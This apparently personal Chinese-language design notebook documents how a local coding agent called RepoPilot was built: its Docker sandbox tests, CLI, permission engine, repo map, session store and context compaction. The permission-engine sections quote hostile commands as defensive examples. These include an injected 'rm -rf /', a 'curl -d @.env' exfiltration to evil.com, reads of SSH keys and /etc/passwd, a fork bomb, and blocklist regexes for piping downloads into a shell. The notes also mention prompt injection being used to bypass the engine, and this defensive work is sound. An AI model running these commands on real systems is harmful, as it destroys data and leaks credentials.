- 在sh中，单引号内的所有字符都是字面量（无转义），包括`$`、`;`、`|`、空格
- 唯一问题是单引号本身不能放在单引号内
- 解决：`'it's'` → `'it'"'"'s'`，即：关闭单引号 → 双引号包裹单引号 → 重新开单引号
- 这是POSIX shell标准的安全引用方法

**攻击场景：** 如果不转义，Agent传入`file.py; rm -rf /`，就变成：
```bash
sed -n '1,200p' file.py; rm -rf /    # 危险！
```
用shquote后：
```bash
sed -n '1,200p' 'file.py; rm -rf /'  # 安全，;被当作文件名的一部分
```

### 6.6 测试DockerSandbox——Mock Docker Client

测试Docker不能每次真的拉镜像启动容器（太慢太重），所以用MagicMock：

```python
def _make_sandbox(tmp_path, exec_returns=None):
    mock_client = MagicMock()
    mock_container = MagicMock()
    mock_client.containers.run.return_value = mock_container
    mock_client.images.get.return_value = MagicMock()  # 镜像存在
    mock_client.api.exec_create.return_value = {"Id": "exec1"}
    # 模拟流式输出
    def fake_exec_start(exec_id, stream=True, demux=True):
        yield (stdout_b, stderr_b)
    mock_client.api.exec_start.side_effect = fake_exec_start
    mock_client.api.exec_inspect.return_value = {"ExitCode": exit_code}
    s = DockerSandbox(repo_path=tmp_path, docker_client=mock_client)
    return s, mock_client, mock_container

def test_setup_starts_container(tmp_path):
    s, mc, container = _make_sandbox(tmp_path)
    s.setup()
    kwargs = mc.containers.run.call_args.kwargs
    assert kwargs["detach"] is True
    assert kwargs["working_dir"] == "/workspace"
    assert "/workspace" in [m["Target"] for m in kwargs["mounts"]]
```

**测试要点：**
- 注入mock_client（通过构造参数`docker_client=mock_client`），不用真实Docker
- mock `containers.run`返回mock容器
- mock `exec_start`用generator模拟流式输出（yield元组）
- 验证setup()传了正确参数：detach=True、working_dir=/workspace、有mount
- 测试teardown()是否真的调用了kill和remove

---

## Step 7：CLI入口（cli.py）

### 7.1 typer命令定义

```python
app = typer.Typer(
    name="repopilot",
    help="RepoPilot - Local-first code agent.",
    add_completion=False,   # 不生成shell补全脚本
    no_args_is_help=True,  # 无参数时显示帮助而非报错
)
```

**子命令嵌套：**
```python
config_app = typer.Typer(help="Manage configuration.")
app.add_typer(config_app, name="config")
# 这样就有 repopilot config show / repopilot config set / repopilot config init
```

### 7.2 首次运行向导

```python
def _ensure_configured() -> None:
    s = get_settings()
    if s.is_configured():
        return
    # 未配置则运行向导
    console.rule("[bold yellow]Welcome to RepoPilot[/bold yellow]")
    model = typer.prompt("Model (provider/model, e.g. openai/gpt-4o-mini)")
    api_key = typer.prompt("API key (sk-...)", hide_input=True)
    base_url = typer.prompt("Base URL (press Enter for default OpenAI)", default="")
    # ... 保存配置
    new.save()
    reset_settings_for_tests()
```

**hide_input=True：** 输入API Key时不回显（类似sudo输入密码）。

### 7.3 API Key脱敏显示

```python
mask = lambda v: ("*" * 8 + v[-4:]) if v and len(v) > 8 else ("(set)" if v else "(not set)")
```
效果：`********1234`，既隐藏了密钥，又让用户能确认是不是正确的key（看后4位）。

### 7.4 测试CLI

用typer的`CliRunner`：

```python
from typer.testing import CliRunner
runner = CliRunner()

def test_version():
    result = runner.invoke(app, ["version"])
    assert result.exit_code == 0
    assert "RepoPilot" in result.output
```

CliRunner不启动真实进程，直接在内存中调用app，快速可测。

---

## 测试体系总结

### 怎么写单元测试？

**原则：**
1. 每个测试只测一个行为
2. 外部依赖全部mock（LLM API、Docker Engine）
3. 文件系统操作用`tmp_path`（pytest内置，自动隔离自动清理）
4. 环境变量用`monkeypatch.setenv`（测试结束自动恢复）
5. 全局状态（如Settings单例）在测试后reset
6. 测试参数用极小值（cooldown=0.05s, backoff=0.001s）加速测试

**pytest fixtures用法：**
```python
@pytest.fixture
def tmp_repo(tmp_path):
    """创建临时测试仓库，包含测试文件"""
    (tmp_path / "main.py").write_text("def add(a, b):\n    return a + b\n")
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg/utils.py").write_text("def greet(name):\n    return f'Hello, {name}!'\n")
    cache = tmp_path / "__pycache__"
    cache.mkdir()
    return tmp_path
```
每个需要"假代码库"的测试函数加`tmp_repo`参数，pytest自动创建临时目录并注入。

**运行测试：**
```bash
pytest tests/ -v              # 详细模式
pytest tests/ -v --cov=repopilot  # 带覆盖率
pytest tests/test_llm.py -v   # 只跑某个文件
```

### 64个测试覆盖矩阵

| 模块 | 测试数 | 覆盖的测试点 |
|------|--------|-------------|
| circuit_breaker | 7 | 初始闭合→阈值触发→打开拒绝→冷却半开→探测成功闭合→探测失败重开→重置→持续成功保持闭合 |
| config | 14 | 默认值→非法参数→模型格式校验→路径展开→env覆盖→类型转换→目录创建→路径属性→缓存单例→边界校验→is_configured→save/load→不保存默认值→env覆盖文件 |
| cli | 2 | version命令→chat TODO消息（mock配置跳过向导） |
| llm | 12 | 返回解析→fast/strong路由→tool_calls解析→重试成功→认证错误不重试→熔断打开→便捷方法→超时参数→stream未实现→错误分类 |
| local_sandbox | 19 | 读文件带行号→分页读→文件不存在→写文件→编辑文件→diff生成→找不到字符串报错→exec echo→非零退出→超时→cwd→路径穿越防护→glob→递归glob→grep→忽略大小写→glob过滤→跳过pycache→list_dir→深度控制→repo_tree |
| docker_sandbox | 7 | 启动容器参数→teardown kill+remove→上下文管理器→exec返回结果→非零退出→shquote→容器路径安全 |
| test_file_tools | 14 | ReadFile带行号/分页/truncation notice → WriteFile大小限制/创建父目录 → EditFile replace_all/old_string为空拒绝/replace_first → 边界情况 |
| test_search_tools | 18 | Grep基本搜索/正则/invalid regex/路径过滤/大小写 → Glob子目录/无匹配/path filter → ListDir带深度 |
| test_exec_tools | 18 | BashTool echo/exit_code/timeout/missing_command/dangerous命令拦截/safe命令confirm/cwd/timeout上限 → RunPythonTool简单print/math计算/missing_code/stderr捕获 |
| test_permission | 120 | (如正文描述) |
| test_hooks | 13 | HookManager注册/触发/pre_tool阻止/post_tool修改结果/cost tracker累计/on_error/on_finish |
| test_cost | 10 | 已知模型价格查询→未知模型返回0→单次调用→累计→per model breakdown→重置→format summary→缺usage key |
| test_tools | 23 | Tool ABC规范→ToolRegistry register/get/schemas/execute auto/execute unknown/execute permission deny/deny mode blocks write/auto allows write/unregister/unnamed tool raises/exception caught/finish propagates |
| test_tools_edge | 35 | truncate_text edge cases→empty file/oversized read/limit zero→write empty/create parents/oversized reject→replace_all/replace first/empty old reject/multiline edit→invalid regex/path filter/case insensitive→path subdirectory/no match→empty command/special chars/long truncate/invalid cwd→multiline code/syntax error/import json→all tools registered/schemas valid openai/finish propagates/sensitive file blocked/deny blocks write+exec |
| test_repo_map | 20 | ignore规则(git/pycache/node_modules/min.js/png/py/dotenv) → symbol提取(functions/class/methods/line numbers/docstring/imports/format/empty source) → RepoMapBuilder(contains files/token budget/from sandbox/update invalidates/binds repo root) |
| test_session | 34 | create/get/list/delete → append incrementing ids/ts/invalid type/nonexistent/tokens accumulated/all event types/empty payload → read all/after_id/after zero/nonexistent → list empty/meta/order/limit → rewind truncate/rewind to zero/updates last_id/rewind+append/negative/nonexistent/preserves prefix → delete/nonexistent → update title → valid event types set |
| test_context | 37 | token estimate empty/short/long/min1 → tool_compact unchanged/truncate long/truncate lines/empty/exact boundary → micro_compact empty/summarizes/failure graceful → auto_compact empty/keeps recent/failure graceful → Step basic/tool_calls/to_message/to_message tool_calls → ContextManager empty/add user/add assistant/add tool result compacts/build with task/set plan/project context/recent steps/token ratio/needs compaction none/micro/auto/compact micro/compact auto/inject skill/add observation/error prefix/update usage |
| **合计** | **406** | |

---

## Step 8：Permission Engine（权限引擎）

### 8.1 为什么Permission Engine不是Sandbox的重复？

Permission Engine和Sandbox是两层独立的防御：

| 层级 | 职责 | 拦截时机 |
|------|------|----------|
| **Permission Engine** | 用户体验层，减少不必要弹窗，已知危险操作立刻拦截 | Agent调用工具前，**在宿主机侧**决策 |
| **Sandbox（Docker）** | 真正的安全边界，操作系统级隔离 | 代码执行时，**在容器内**限制资源/文件/网络 |

Permission Engine 即使被绕过（prompt injection让Agent构造特殊命令），Docker沙盒仍然会兜底（bind mount只挂workspace、network=none断网、cgroups限制资源）。这是defense in depth（纵深防御）。

### 8.2 四种审批模式详解

```
auto模式（完全信任）：
  只读工具 → allow
  黑名单命中 → deny
  网络命令 → 看network_enabled
  其余 → allow（用户显式--approval-mode auto）

confirm模式（默认，推荐）：
  只读工具 → allow
  黑名单命中 → deny
  真正安全命令（is_safe_cmd判断） → allow
  代码执行(python -c)/网络(curl/pip)/环境(env)/写操作 → ask用户
  其余 → ask

edit-only模式（代码审查）：
  只读工具 → allow
  所有exec工具 → deny（不能跑命令）
  写工具 → ask
  黑名单 → deny

deny模式（只读审计）：
  只读工具 → allow
  其余 → deny
```

### 8.3 is_safe_cmd()的多层检测——为什么不能只看命令前缀？

第一版的`is_safe_cmd_prefix()`只检查argv[0]是否在白名单中，这导致大量绕过：

| 命令 | prefix检测 | 实际风险 | 现在的检测 |
|------|-----------|----------|-----------|
| `python -c "import os; os.system('sudo x')"` | python在白名单→allow | 执行任意代码，甚至调sudo | 检测`-c/-e/--eval` flag+解释器→ask |
| `cat /etc/passwd` | cat在白名单→allow | 读取系统文件 | 检测命令中包含`/etc/`、`~/.ssh/`等敏感路径→deny |
| `echo hi > /tmp/evil.sh` | echo在白名单→allow | 写任意文件 | 检测`>`/`>>`/`| tee`写操作符→ask |
| `env` | env不在白名单→auto下allow | 泄露API_KEY等环境变量 | env/printenv加入REQUIRE_CONFIRM→ask |
| `pip install unknown-pkg` | pip在白名单→allow | 安装恶意包、访问网络 | pip install加入网络命令检测→ask |
| `git push origin main` | git在白名单→allow | 推送代码到远程 | 区分git子命令：status/diff/log是safe，push/commit/clone→ask |
| `cat ../secret.txt` | cat在白名单→allow | 路径穿越读workspace外文件 | 检测`cat ../`、`> ../`→deny |

### 8.4 Safe命令严格标准

一个命令要被auto-allow必须同时满足：
1. argv[0]在`SAFE_CMD_PREFIXES`中（ls/cat/head/grep/pytest/git等）
2. 没有写操作符（`>`/`>>`/`| tee`）
3. 没有代码执行flag（python/node/bash的`-c`/`-e`/`-m`）
4. 不引用敏感路径（~/.ssh/、.env、/etc/）
5. 不访问系统绝对路径（`/etc/`、`/root/`、`/proc/`）
6. git命令必须是只读子命令（status/diff/log/show/log，不含push/commit/clone）
7. tar不包含`-x`（解压），unzip必须有`-l`（只列不拆）

### 8.5 黑名单正则模式

危险命令使用re.compile预编译正则匹配：

| 类型 | 正则示例 | 匹配示例 |
|------|----------|----------|
| 破坏性文件操作 | `rm -rf /`或`~`结尾 | `rm -rf /`、`rm -rf ~` |
| 提权 | `^\s*sudo\b` | 行首sudo |
| 远程代码执行 | `curl.*\|sh` | curl|sh, wget|bash, curl|python |
| 危险权限 | `chmod -R 777` | 递归777 |
| 破坏性git | `git push (-f|--force)` | force push |
| fork炸弹 | `:(){ :\|:& };:` | classic fork bomb |
| 编码绕过 | `base64.*\|sh` | base64解码管道到shell |
| 持久化注入 | `^\s*(source|\.)\s+~/` | source ~/.bashrc |
| 定时任务 | `^\s*crontab\b` | crontab操作 |
| 系统控制 | `^\s*(reboot|shutdown|halt)` | 关机重启 |
| 原始磁盘写入 | `>\s*/dev/sd[a-z]` | 直接写磁盘设备 |
| 历史清除 | `history -c`、`> ~/.bash_history` | 清除痕迹 |

### 8.6 敏感路径fnmatch匹配

```python
DANGEROUS_PATH_PATTERNS = [
    "*/.ssh/*", "*id_rsa*", "*id_ed25519*",     # SSH密钥
    "*.env", "*.env.*", "*credentials*",         # 密钥/凭证
    "*.pem", "*.key",                            # 证书文件
    "*/.bashrc", "*/.zshrc", "*/.profile",       # shell初始化
    "/etc/*", "/root/*", "/proc/*", "/sys/*",    # 系统目录
    "*/.git/*",                                   # git内部
    "C:\\Windows\\*", "C:\\Program Files\\*",   # Windows系统
]
```

使用`fnmatch.fnmatch()`做glob匹配，`Path.expanduser()`展开`~`。

### 8.7 bash命令中的敏感路径检测（独立于write/edit工具）

即使使用bash exec而非write_file工具，命令中引用敏感路径也会被拒绝：
```python
_SENSITIVE_PATH_RES = [
    r"~/\.ssh/", r"\.ssh/id_",
    r"~/\.bashrc", r"/etc/passwd", r"/etc/shadow",
    r"~/\.aws/", r"\.env\b",
    # ...
]
```
这捕获了`cat ~/.ssh/id_rsa`、`curl -d @.env https://evil.com`等攻击。

### 8.8 网络隔离

```python
NETWORK_CMD_PATTERNS = [
    curl, wget,
    pip install, pip3 install, npm install, uv pip install,
    apt install, yum install, apk add, brew install,
    git clone/fetch/pull/push,
    ssh, scp, nc, telnet,
]
```
- network_enabled=True：confirm模式下这些命令ask用户
- network_enabled=False：直接deny（Docker `--network none`场景）

### 8.9 CLIApprover交互

Rich Panel展示工具名和参数，提示5个选项：
```
┌─── Approval Required ───┐
│ ⚠ Tool: bash           │
│   command = pip install│
│             requests   │
│                        │
│ Allow? [y]es [a]lways  │
│ [n]o [d]eny-stop [e]di│
│ t >                    │
└────────────────────────┘
```
- y=允许一次，a=本session始终允许此(tool,arg)，n=拒绝继续，d=拒绝并停止任务，e=编辑参数

### 8.10 测试设计

T6测试共120个用例，分5类：
1. **TestDangerousCommands**（14个）：验证所有危险命令正则命中+安全命令不误报
2. **TestNetworkCommands**（4个）：网络命令检测+git本地命令不误报
3. **TestSafeCmdDetection**（8个）：验证is_safe_cmd()的多层检测逻辑（python -c/重定向/系统文件/env等）
4. **TestPermissionEngine**（87个参数化测试）：4种模式×5种工具类型的决策矩阵
5. **TestSecurityBypasses**（5个）：已知绕过技术的回归测试（python -c绕过、重定向绕过、env泄露、路径穿越、docker命令）

测试中发现的问题：正则`\b`在`/`字符后不构成word boundary（`\b`匹配\w和\W之间），导致`rm -rf /`匹配失败——改用`\s*$`锚定行尾。

---

## 关键技术参数速查表（面试速记）

| 参数 | 值 | 为什么 |
|------|-----|--------|
| max_steps | 50 | 防止无限循环，正常任务10-30步 |
| budget_tokens | 200,000 | 单次任务token上限 |
| tool_timeout | 30s | 工具执行超时 |
| FAST tier超时 | 15s | 简单任务快速失败 |
| DEFAULT tier超时 | 25s | 编码任务 |
| STRONG tier超时 | 40s | 复杂推理 |
| max_retries | 2 | 每个调用最多重试2次（共3次尝试） |
| backoff_base | 0.5s | 指数退避起始 |
| backoff_cap | 8s | 退避上限 |
| CB window | 20 | 滑动窗口大小 |
| CB min_calls | 5 | 熔断前最小样本 |
| CB error_rate | 0.5 | 50%失败率熔断 |
| CB cooldown | 60s | 熔断后冷却时间 |
| Docker CPU | 2核(200000/100000) | cgroup CFS参数 |
| Docker内存 | 2g | 防止OOM |
| read_file默认行数 | 200行 | 约2000-4000 tokens |
| exec输出截断 | head 500 + tail 1500 | 错误信息在尾部 |
| compact_micro_ratio | 0.7 | 70%触发轻量压缩 |
| compact_auto_ratio | 0.85 | 85%强制压缩 |
| recent_keep_steps | 10轮 | 压缩时保留最近N轮 |



---

## Step 11：tree-sitter Repo Map（代码索引）

### 11.1 为什么要做 Repo Map？

Agent每次开始任务时，需要知道代码库里有什么文件、每个文件定义了什么。最初用简单的glob列出文件名，但对于一个有几百个文件的项目，只给文件名Agent不知道该读哪个。

Repo Map 给Agent一张"代码地图"：不仅列出文件，还展示每个文件里定义了哪些类、函数、方法，以及它们的docstring和行号。Agent看到`L42 class Calculator — Performs arithmetic operations`就知道Calculator类在第42行。

这是Aider和Claude Code都使用的技术，比embedding检索精准且快。

### 11.2 tree-sitter 版本兼容坑

tree-sitter 0.21.x和0.22+/0.26.x API变化巨大：
- 0.21.x：`Language(tree_sitter_python.language(), "python")`（旧API，稳定）
- 0.26.x：`tree_sitter_python.language()`返回`Language`对象直接用，但Parser.set_language API变了

选择pin到`tree-sitter>=0.21,<0.22`和`tree-sitter-python>=0.21,<0.22`确保兼容。

### 11.3 忽略机制（ignore.py）

```python
BUILTIN_IGNORE = [
    ".git/", "__pycache__/", "node_modules/", ".venv/", "venv/",
    "dist/", "build/", ".tox/", ".mypy_cache/", ".pytest_cache/",
    "*.min.js", "*.min.css", "*.bundle.js",
    "*.pyc", "*.pyo", "*.so", "*.dylib", "*.dll", "*.exe",
    "*.png", "*.jpg", "*.jpeg", "*.gif", "*.ico", "*.pdf",
    "*.zip", "*.tar.gz", "*.woff", "*.woff2", "*.ttf",
]
```
- 内置模式用`fnmatch`匹配
- 如果项目有`.gitignore`，用`pathspec`库解析
- `.env`文件不在忽略列表（Agent可能需要读环境变量配置），但Permission Engine会阻止写入

### 11.4 AST递归遍历的关键设计

`_walk()`函数递归遍历所有节点，核心问题是**class里的method嵌套在class的block节点里**：
- 第一版只遍历class_definition的direct children，会漏掉方法（方法在block子节点里）
- 修复：对class_definition递归调用`_walk(child, ..., parent=name)`传入父类名
- 对decorated_definition（@decorator包裹的函数/类）特殊处理：找到内部的class/function节点
- docstring提取：在block里找第一个expression_statement包含string节点，剥离三引号/单引号/双引号，取第一行前120字符

### 11.5 Token预算策略

- 按文件大小升序排列（小文件通常是核心入口和定义）
- ~4字符/token估算
- 单文件>100KB跳过（通常是minified代码或生成文件）
- 累计字符数超过max_tokens*4时截断，追加"N more files omitted"
- 非Python文件（暂不支持AST解析）显示行数：`README.md (120 lines)`

### 11.6 Sandbox集成

LocalSandbox.get_repo_tree()和DockerSandbox.get_repo_tree()都改为try RepoMapBuilder，失败时fallback到简单glob列表。DockerSandbox因为是bind mount，可以直接用self.repo_path（宿主机路径）建RepoMapBuilder，不需要在容器内装tree-sitter。

### 11.7 测试遇到的问题

1. **行号偏移**：测试用的SAMPLE_PY字符串以`\n`开头，导致空行占了第一行，top_level_function实际在第8行不是第9行。修复测试期望值。
2. **get_repo_tree未更新**：第一次修改时LocalSandbox的get_repo_tree没有被正确替换（正则替换没匹配到），导致`test_build_from_sandbox`失败——手动修复替换逻辑。
3. **`\n`转义问题**：Python脚本里`"\\n".join`在PowerShell here-string传递时被解析成真正的换行符，导致语法错误——用脚本文件方式修复。

---

## Step 12：Session Store（会话存储）

### 12.1 JSONL + SQLite 双存储的设计理由

- **JSONL（rollout file）**：每行一个JSON对象，append-only写入，崩溃安全（之前的行不会丢失），可以用任何文本工具查看
- **SQLite索引**：存元数据（id, title, cwd, model, timestamps, tokens），快速列会话不需要遍历所有JSONL文件
- 为什么不用纯SQLite？大文本tool result存在SQLite里性能差、不透明
- 为什么不用纯JSON？追加需要读-改-写整个文件，崩溃风险大

### 12.2 文件路径格式

```
~/.repopilot/
├── config.toml           # 配置
├── state.sqlite          # SQLite索引
└── sessions/
    └── 2026/
        └── 07/
            └── 12/
                ├── rollout-1783831232-a1b2c3d4e5f6.jsonl
                └── rollout-1783845678-9876543210ab.jsonl
```
按年月日分层目录，避免一个目录下文件太多。文件名包含时间戳和session ID短前缀。

### 12.3 事件格式

```json
{"id": 1, "ts": "2026-07-12T08:40:32.123456+00:00", "type": "user_msg", "payload": {"content": "fix the bug"}}
{"id": 2, "ts": "2026-07-12T08:40:35+00:00", "type": "assistant_msg", "payload": {"content": "Let me check...", "usage": {"total_tokens": 150}}}
{"id": 3, "ts": "2026-07-12T08:40:36+00:00", "type": "tool_call", "payload": {"tool": "read_file", "args": {"path": "main.py"}}}
```
事件ID从1开始自增，ts是ISO8601 UTC时间戳，type从12种预定义类型中选择。

### 12.4 线程安全设计

```python
self._locks: dict[str, threading.Lock] = {}
self._locks_guard = threading.Lock()

def _get_lock(self, session_id):
    with self._locks_guard:
        if session_id not in self._locks:
            self._locks[session_id] = threading.Lock()
        return self._locks[session_id]
```
每个session一个lock（lazy创建），全局guard lock保护locks字典本身。append_event/rewind/delete都要获取对应session的lock。

### 12.5 rewind的实现

rewind是"时间旅行"功能——Agent走了一条错误路径后可以回退到之前的状态重试：
1. 读取所有事件
2. 取前step个
3. 覆盖写JSONL文件
4. 更新SQLite last_event_id
rewind后append_event时，用`_count_lines()`重新数行数作为next_id，保证ID连续。

### 12.6 时间戳精度问题

最初用`int(now)`（秒级int）存储created_at/updated_at，连续创建多个session时updated_at相同导致排序不稳定。改为毫秒精度`int(now * 1000)`，读取时除以1000还原为float秒。

### 12.7 tokens_used自动累计

append_event检测event_type为assistant_msg时，从payload.usage.total_tokens提取并累计到SQLite的tokens_used字段。cost事件也可以手动传入tokens。

---

## Step 13：Context Manager + 三级压缩

### 13.1 分层消息组装

build_messages()按固定顺序组装消息数组：
1. **System**：固定系统提示词
2. **Project Context**：repo_map + memory + injected_skills（如果有）
3. **Plan**：当前执行计划
4. **Summary**：压缩后的早期对话摘要
5. **Recent Steps**：倒序放入，受预算限制（最近的优先保留）
6. **Pending Tool Result**：上一个工具的结果（如果有未处理的）
7. **Task**：当前任务作为最后的user消息

### 13.2 _select_steps_for_budget() 预算分配

从最后一个step倒序遍历，累加token数，超过预算就停止。这样保证最近的对话永远优先保留，最老的对话最先被截断。剩余预算 = budget - system - project - plan - summary的开销。

### 13.3 三级压缩的触发逻辑

```python
def needs_compaction(self):
    ratio = self.token_usage_ratio()
    if ratio >= 0.90:  # AUTO_COMPACT_THRESHOLD
        return "auto"
    if ratio >= 0.75:  # MICRO_COMPACT_THRESHOLD
        return "micro"
    return None
```
AgentLoop每次迭代前调用needs_compaction()，如果返回micro/auto就执行对应compact()。

**tool-compact在工具结果加入时自动执行**（不需要等到阈值），因为单个工具输出可能就超过几万字符。

### 13.4 micro-compact vs auto-compact的区别

| 维度 | micro-compact | auto-compact |
|------|---------------|--------------|
| 触发阈值 | 75% | 90% |
| 压缩范围 | 最老的3-5步 | 除最近10步外全部 |
| 压缩结果 | 1-2句话 | 4段结构化摘要（Completed/Findings/Files/Unresolved） |
| Prompt约束 | 80词以内 | 400词以内，每bullet 20词以内 |
| 成本 | 低（输入~500tok，输出~50tok） | 中（输入可能~50Ktok，输出~300tok） |
| 频率 | 可能多次触发 | 通常只触发一次（接近满时） |

### 13.5 LLM失败降级

micro_compact/auto_compact都有try/except包裹LLM调用，如果LLM不可用（网络错误/模型错误），返回placeholder文本（"[N earlier steps summarized but LLM unavailable]"），而不是崩溃。这保证Agent在LLM故障时仍能继续运行（虽然可能丢失部分历史上下文，但不会中断任务）。

### 13.6 add_tool_result自动tool-compact

所有工具结果在加入steps之前先经过tool_compact()（12000字符/200行上限），错误结果加"Error: "前缀。这确保单个工具的超大输出（比如`cat`一个大文件、`grep`返回几千行）不会直接撑爆上下文。

### 13.7 Token校准机制

初始用len//4估算（中英混合代码的近似值），每次拿到LLM API返回的真实prompt_tokens后，调用update_actual_usage(actual)计算校准系数=actual/estimated，后续估算乘以这个系数越来越准确。

---

## 关键技术参数速查表（面试速记，更新版）

| 参数 | 值 | 为什么 |
|------|-----|--------|
| max_steps | 50 | 防止无限循环，正常任务10-30步 |
| budget_tokens | 120,000 | 单次任务token上限（doubao-seed-evolving支持5M） |
| tool_timeout | 30s | 工具执行超时 |
| FAST tier超时 | 15s | 简单任务快速失败 |
| DEFAULT tier超时 | 25s | 编码任务 |
| STRONG tier超时 | 40s | 复杂推理 |
| max_retries | 2 | 每个调用最多重试2次（共3次尝试） |
| backoff_base | 0.5s | 指数退避起始 |
| backoff_cap | 8s | 退避上限 |
| CB window | 20 | 滑动窗口大小 |
| CB min_calls | 5 | 熔断前最小样本 |
| CB error_rate | 0.5 | 50%失败率熔断 |
| CB cooldown | 60s | 熔断后冷却时间 |
| Docker CPU | 2核 | cgroup CFS参数 |
| Docker内存 | 2g | 防止OOM |
| read_file默认行数 | 200行 | 约2000-4000 tokens |
| TOOL_OUTPUT_MAX_CHARS | 12000 | tool-compact字符上限 |
| TOOL_OUTPUT_MAX_LINES | 200 | tool-compact行数上限 |
| MICRO_COMPACT_THRESHOLD | 0.75 | 75%触发micro |
| AUTO_COMPACT_THRESHOLD | 0.90 | 90%触发auto |
| RECENT_STEPS_KEEP | 10步 | auto-compact保留最近步数 |
| tree-sitter版本 | 0.21.x | 0.22+ API不兼容，pin版本 |
| RepoMap大文件阈值 | 100KB | 超过则跳过索引 |
| CHARS_PER_TOKEN | 4 | 中英混合代码近似 |
| session时间戳精度 | 毫秒 | int(ts*1000)避免同秒排序冲突 |
| 总测试数 | 406 | 全量pytest 31秒内通过 |
